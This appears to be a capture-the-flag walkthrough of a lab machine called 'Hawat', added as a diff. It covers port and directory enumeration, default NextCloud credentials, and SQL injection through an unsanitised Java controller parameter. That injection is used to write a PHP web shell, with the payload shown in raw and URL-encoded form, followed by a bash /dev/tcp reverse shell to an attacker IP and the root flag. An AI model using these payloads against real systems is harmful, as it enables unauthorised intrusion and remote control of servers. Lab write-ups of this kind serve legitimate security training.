@@ -1,0 +1,144 @@
+																							              Hawat Walkthrough
+																							
+																										
+Attacker's Machine: 192.168.45.169
+Victim's Machine: 192.168.221.147
+export IP=192.168.221.147
+
+./nmapAutomator.sh -H $IP -t full
+
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
+17445/tcp open  unknown
+30455/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: W3.CSS
+50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
+|_http-title: W3.CSS Template
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
+
+Enumeration
+17445
+# We can create a new user aparently and log in the application where we discover 2 users
+
+clinton
+dummy
+
+gobuster dir -u http://$IP:17445 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -b 404,302
+
+30455
+dirb http://$IP:30455
+http://192.168.221.147:30455/index.php (CODE:200|SIZE:3356)                                                                                                                 
+http://192.168.221.147:30455/phpinfo.php (CODE:200|SIZE:68638)
+
+50080
+
+gobuster dir -u http://$IP:50080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -b 404,302
+
+/4                    (Status: 301) [Size: 239] [--> http://192.168.221.147:50080/4/]
+/images               (Status: 301) [Size: 244] [--> http://192.168.221.147:50080/images/]
+/cloud                (Status: 301) [Size: 243] [--> http://192.168.221.147:50080/cloud/]
+
+http://192.168.221.147:50080/cloud       ⇒ login page for NextCloud
+
+# Try common credentials. Discovered valid credentials admin/admin
+
+
+
+# Found some credentials, might be usefull later on
+
+
+
+# Go to issuetracker/src/main/java/com/issue/tracker/issues and check out IssueController.java file.
+
+
+
+# Aparently they aren't sanitizing the input, as they should, and they just append the priority parameter to the query.
+
+SELECT message FROM issue WHERE priority='High'
+
+# Hence, we can pretty much perform SQL Injection at will by injecting new command in the query with '.
+
+# Tried on port 30455, no luck, however, it does work on port 17445
+
+# Bingo
+
+
+
+# Confirm that the system if vulnerable. Switch from GET to POST method.
+
+
+
+# Good, now let's try to upload a php file which contains a vulnerable parameter from which we can obtain shell.
+   But, we need the root directory of the application. When we did the enumeration, we saw that on port 30445 we discovered phpinfo.php file
+   
+   
+   
+# If we didn't find anything, I guess we could've went for /var/www/html as default
+
+Payload: ' union select '<?php echo system($_GET["cmd"]); ?>' into outfile '/srv/http/shell_me.php' -- -
+
+# URL encode the payload first
+
+%27%20union%20select%20%27%3C%3Fphp%20echo%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%27%20into%20outfile%20%27%2Fsrv%2Fhttp%2Fshell_me.php%27%20--%20-
+
+
+
+# Let's try to see if your php file was uploaded
+
+
+
+# Aparently, the file is not accessible through 17445, let's try the server on port 30455
+
+
+# Alright, it seems that our php file is available on port 30455. Let's see if your cmd parameter give us command execution on the server
+
+
+
+# Nice, now let's get shell on the system. I've tried on port 4444 with multiple payloads, but i had no luck, let's try to use a port which is already opened. 17445
+
+bash -i >& /dev/tcp/192.168.45.231/17445 0>&1
+
+
+cd /root
+cat proof.txt
+4d5a9614d2b869349fe3e722d6d4dd9f
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+ 
